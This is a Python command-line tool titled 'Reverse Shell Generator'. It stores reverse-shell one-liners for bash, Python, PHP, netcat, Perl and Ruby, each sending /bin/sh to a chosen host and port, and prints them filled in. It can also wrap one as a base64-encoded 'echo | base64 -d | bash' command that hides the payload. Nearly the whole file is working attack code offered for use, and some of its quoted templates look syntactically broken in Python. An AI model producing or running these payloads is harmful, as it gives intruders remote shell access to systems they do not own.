#!/usr/bin/env python3
"""
Reverse Shell Generator - Multiple platforms/methods
Author: nadirzhon | github.com/nadirzhon
"""

import argparse
import base64

SHELLS = {
    "bash": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "python3": 'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
    "php": 'php -r '\''$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\''',
    "netcat": "nc -e /bin/sh {ip} {port}",
    "netcat_mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
    "perl": 'perl -e '\''use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");\''',
    "ruby": 'ruby -rsocket -e'\''f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''',
}

def main():
    parser = argparse.ArgumentParser(description="Reverse Shell Generator")
    parser.add_argument("-l", "--lhost", required=True)
    parser.add_argument("-p", "--lport", required=True)
    parser.add_argument("-t", "--type", choices=list(SHELLS.keys()))
    parser.add_argument("--all", action="store_true")
    parser.add_argument("--b64", action="store_true")
    args = parser.parse_args()

    if args.all:
        print(f"\n=== Reverse Shells for {args.lhost}:{args.lport} ===\n")
        for name, tmpl in SHELLS.items():
            shell = tmpl.format(ip=args.lhost, port=args.lport)
            print(f"[{name}]\n  {shell}\n")
    elif args.type:
        shell = SHELLS[args.type].format(ip=args.lhost, port=args.lport)
        if args.b64:
            enc = base64.b64encode(shell.encode()).decode()
            print(f"echo {enc} | base64 -d | bash")
        else:
            print(shell)
    else:
        print("Use --type TYPE or --all")
        print(f"Types: {', '.join(SHELLS.keys())}")

if __name__ == "__main__":
    main()
